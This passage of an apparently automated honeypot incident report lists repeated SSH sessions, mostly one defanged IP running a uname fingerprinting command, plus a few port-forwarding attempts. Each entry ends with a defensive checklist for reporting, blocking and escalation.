| `2026-08-23 12:46:25` | `cowrie.command.input` |
| `2026-08-23 12:46:25` | `cowrie.log.closed` |
| `2026-08-23 12:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23a3295e4a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:28` | `cowrie.session.connect` |
| `2026-08-23 12:46:28` | `cowrie.client.version` |
| `2026-08-23 12:46:28` | `cowrie.client.kex` |
| `2026-08-23 12:46:28` | `cowrie.login.success` |
| `2026-08-23 12:46:29` | `cowrie.session.params` |
| `2026-08-23 12:46:29` | `cowrie.command.input` |
| `2026-08-23 12:46:30` | `cowrie.log.closed` |
| `2026-08-23 12:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9686f65a8349

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:33` | `cowrie.session.connect` |
| `2026-08-23 12:46:33` | `cowrie.client.version` |
| `2026-08-23 12:46:33` | `cowrie.client.kex` |
| `2026-08-23 12:46:34` | `cowrie.login.success` |
| `2026-08-23 12:46:34` | `cowrie.session.params` |
| `2026-08-23 12:46:34` | `cowrie.command.input` |
| `2026-08-23 12:46:35` | `cowrie.log.closed` |
| `2026-08-23 12:46:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447827d83a0d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:38` | `cowrie.session.connect` |
| `2026-08-23 12:46:38` | `cowrie.client.version` |
| `2026-08-23 12:46:38` | `cowrie.client.kex` |
| `2026-08-23 12:46:39` | `cowrie.login.success` |
| `2026-08-23 12:46:39` | `cowrie.session.params` |
| `2026-08-23 12:46:39` | `cowrie.command.input` |
| `2026-08-23 12:46:40` | `cowrie.log.closed` |
| `2026-08-23 12:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-608b83d3b8bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:44` | `cowrie.session.connect` |
| `2026-08-23 12:46:44` | `cowrie.client.version` |
| `2026-08-23 12:46:44` | `cowrie.client.kex` |
| `2026-08-23 12:46:44` | `cowrie.login.success` |
| `2026-08-23 12:46:45` | `cowrie.session.params` |
| `2026-08-23 12:46:45` | `cowrie.command.input` |
| `2026-08-23 12:46:45` | `cowrie.log.closed` |
| `2026-08-23 12:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b4abc8b3893

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:49` | `cowrie.session.connect` |
| `2026-08-23 12:46:49` | `cowrie.client.version` |
| `2026-08-23 12:46:49` | `cowrie.client.kex` |
| `2026-08-23 12:46:49` | `cowrie.login.success` |
| `2026-08-23 12:46:50` | `cowrie.session.params` |
| `2026-08-23 12:46:50` | `cowrie.command.input` |
| `2026-08-23 12:46:50` | `cowrie.log.closed` |
| `2026-08-23 12:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00436f82e64a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:54` | `cowrie.session.connect` |
| `2026-08-23 12:46:54` | `cowrie.client.version` |
| `2026-08-23 12:46:54` | `cowrie.client.kex` |
| `2026-08-23 12:46:54` | `cowrie.login.success` |
| `2026-08-23 12:46:55` | `cowrie.session.params` |
| `2026-08-23 12:46:55` | `cowrie.command.input` |
| `2026-08-23 12:46:56` | `cowrie.log.closed` |
| `2026-08-23 12:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9b0835c7e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:59` | `cowrie.session.connect` |
| `2026-08-23 12:46:59` | `cowrie.client.version` |
| `2026-08-23 12:46:59` | `cowrie.client.kex` |
| `2026-08-23 12:47:00` | `cowrie.login.success` |
| `2026-08-23 12:47:00` | `cowrie.session.params` |
| `2026-08-23 12:47:00` | `cowrie.command.input` |
| `2026-08-23 12:47:01` | `cowrie.log.closed` |
| `2026-08-23 12:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee1fbdadc7d8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:05` | `cowrie.session.connect` |
| `2026-08-23 12:47:05` | `cowrie.client.version` |
| `2026-08-23 12:47:05` | `cowrie.client.kex` |
| `2026-08-23 12:47:05` | `cowrie.login.success` |
| `2026-08-23 12:47:06` | `cowrie.session.params` |
| `2026-08-23 12:47:06` | `cowrie.command.input` |
| `2026-08-23 12:47:06` | `cowrie.log.closed` |
| `2026-08-23 12:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76de04bca0e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:10` | `cowrie.session.connect` |
| `2026-08-23 12:47:10` | `cowrie.client.version` |
| `2026-08-23 12:47:10` | `cowrie.client.kex` |
| `2026-08-23 12:47:10` | `cowrie.login.success` |
| `2026-08-23 12:47:11` | `cowrie.session.params` |
| `2026-08-23 12:47:11` | `cowrie.command.input` |
| `2026-08-23 12:47:11` | `cowrie.log.closed` |
| `2026-08-23 12:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f308ca15af84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:15` | `cowrie.session.connect` |
| `2026-08-23 12:47:15` | `cowrie.client.version` |
| `2026-08-23 12:47:15` | `cowrie.client.kex` |
| `2026-08-23 12:47:16` | `cowrie.login.success` |
| `2026-08-23 12:47:16` | `cowrie.session.params` |
| `2026-08-23 12:47:16` | `cowrie.command.input` |
| `2026-08-23 12:47:16` | `cowrie.log.closed` |
| `2026-08-23 12:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57dec69f374c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:21` | `cowrie.session.connect` |
| `2026-08-23 12:47:21` | `cowrie.client.version` |
| `2026-08-23 12:47:21` | `cowrie.client.kex` |
| `2026-08-23 12:47:21` | `cowrie.login.success` |
| `2026-08-23 12:47:22` | `cowrie.session.params` |
| `2026-08-23 12:47:22` | `cowrie.command.input` |
| `2026-08-23 12:47:22` | `cowrie.log.closed` |
| `2026-08-23 12:47:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d3faaf7499

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:25` | `cowrie.session.connect` |
| `2026-08-23 12:47:26` | `cowrie.client.version` |
| `2026-08-23 12:47:26` | `cowrie.client.kex` |
| `2026-08-23 12:47:28` | `cowrie.login.success` |
| `2026-08-23 12:47:28` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a686d29464

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:26` | `cowrie.session.connect` |
| `2026-08-23 12:47:26` | `cowrie.client.version` |
| `2026-08-23 12:47:26` | `cowrie.client.kex` |
| `2026-08-23 12:47:26` | `cowrie.login.success` |
| `2026-08-23 12:47:27` | `cowrie.session.params` |
| `2026-08-23 12:47:27` | `cowrie.command.input` |
| `2026-08-23 12:47:27` | `cowrie.log.closed` |
| `2026-08-23 12:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b79bf400d18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:31` | `cowrie.session.connect` |
| `2026-08-23 12:47:31` | `cowrie.client.version` |
| `2026-08-23 12:47:31` | `cowrie.client.kex` |
| `2026-08-23 12:47:32` | `cowrie.login.success` |
| `2026-08-23 12:47:33` | `cowrie.session.params` |
| `2026-08-23 12:47:33` | `cowrie.command.input` |
| `2026-08-23 12:47:33` | `cowrie.log.closed` |
| `2026-08-23 12:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f9083dcee8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:36` | `cowrie.session.connect` |
| `2026-08-23 12:47:36` | `cowrie.client.version` |
| `2026-08-23 12:47:36` | `cowrie.client.kex` |
| `2026-08-23 12:47:37` | `cowrie.login.success` |
| `2026-08-23 12:47:38` | `cowrie.session.params` |
| `2026-08-23 12:47:38` | `cowrie.command.input` |
| `2026-08-23 12:47:38` | `cowrie.log.closed` |
| `2026-08-23 12:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-832213746e3b

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:38` | `cowrie.session.connect` |
| `2026-08-23 12:47:38` | `cowrie.client.version` |
| `2026-08-23 12:47:38` | `cowrie.client.kex` |
| `2026-08-23 12:47:40` | `cowrie.login.success` |
| `2026-08-23 12:47:41` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffce6f5fb213

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:41` | `cowrie.session.connect` |
| `2026-08-23 12:47:41` | `cowrie.client.version` |
| `2026-08-23 12:47:41` | `cowrie.client.kex` |
| `2026-08-23 12:47:42` | `cowrie.login.success` |
| `2026-08-23 12:47:42` | `cowrie.session.params` |
| `2026-08-23 12:47:42` | `cowrie.command.input` |
| `2026-08-23 12:47:43` | `cowrie.log.closed` |
| `2026-08-23 12:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118f78cdd736

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:46` | `cowrie.session.connect` |
| `2026-08-23 12:47:47` | `cowrie.client.version` |
| `2026-08-23 12:47:47` | `cowrie.client.kex` |
| `2026-08-23 12:47:49` | `cowrie.login.success` |
| `2026-08-23 12:47:50` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f740690354

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:47` | `cowrie.session.connect` |
| `2026-08-23 12:47:47` | `cowrie.client.version` |
| `2026-08-23 12:47:47` | `cowrie.client.kex` |
| `2026-08-23 12:47:47` | `cowrie.login.success` |
| `2026-08-23 12:47:48` | `cowrie.session.params` |
| `2026-08-23 12:47:48` | `cowrie.command.input` |
| `2026-08-23 12:47:48` | `cowrie.log.closed` |
| `2026-08-23 12:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0481ce380d10

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:52` | `cowrie.session.connect` |
| `2026-08-23 12:47:52` | `cowrie.client.version` |
| `2026-08-23 12:47:52` | `cowrie.client.kex` |
| `2026-08-23 12:47:52` | `cowrie.login.success` |
| `2026-08-23 12:47:53` | `cowrie.session.params` |
| `2026-08-23 12:47:53` | `cowrie.command.input` |
| `2026-08-23 12:47:53` | `cowrie.log.closed` |
| `2026-08-23 12:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c7e0b6feaee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:47 |
| **Last Seen** | 2026-08-23 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:47:57` | `cowrie.session.connect` |
| `2026-08-23 12:47:57` | `cowrie.client.version` |
| `2026-08-23 12:47:57` | `cowrie.client.kex` |
| `2026-08-23 12:47:58` | `cowrie.login.success` |
| `2026-08-23 12:47:58` | `cowrie.session.params` |
| `2026-08-23 12:47:58` | `cowrie.command.input` |
| `2026-08-23 12:47:58` | `cowrie.log.closed` |
| `2026-08-23 12:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-403a3043bf42

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:02` | `cowrie.session.connect` |
| `2026-08-23 12:48:02` | `cowrie.client.version` |
| `2026-08-23 12:48:02` | `cowrie.client.kex` |
| `2026-08-23 12:48:03` | `cowrie.login.success` |
| `2026-08-23 12:48:04` | `cowrie.session.params` |
| `2026-08-23 12:48:04` | `cowrie.command.input` |
| `2026-08-23 12:48:04` | `cowrie.log.closed` |
| `2026-08-23 12:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd9f5b1cab0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:07` | `cowrie.session.connect` |
| `2026-08-23 12:48:08` | `cowrie.client.version` |
| `2026-08-23 12:48:08` | `cowrie.client.kex` |
| `2026-08-23 12:48:08` | `cowrie.login.success` |
| `2026-08-23 12:48:09` | `cowrie.session.params` |
| `2026-08-23 12:48:09` | `cowrie.command.input` |
| `2026-08-23 12:48:09` | `cowrie.log.closed` |
| `2026-08-23 12:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b96eb95fe7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:13` | `cowrie.session.connect` |
| `2026-08-23 12:48:13` | `cowrie.client.version` |
| `2026-08-23 12:48:13` | `cowrie.client.kex` |
| `2026-08-23 12:48:13` | `cowrie.login.success` |
| `2026-08-23 12:48:14` | `cowrie.session.params` |
| `2026-08-23 12:48:14` | `cowrie.command.input` |
| `2026-08-23 12:48:14` | `cowrie.log.closed` |
| `2026-08-23 12:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a7628c4297e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:48:18` | `cowrie.session.connect` |
| `2026-08-23 12:48:18` | `cowrie.client.version` |
| `2026-08-23 12:48:18` | `cowrie.client.kex` |
| `2026-08-23 12:48:18` | `cowrie.login.success` |
| `2026-08-23 12:48:19` | `cowrie.session.params` |
| `2026-08-23 12:48:19` | `cowrie.command.input` |
| `2026-08-23 12:48:19` | `cowrie.log.closed` |
| `2026-08-23 12:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0997027e587

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:48 |
| **Last Seen** | 2026-08-23 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
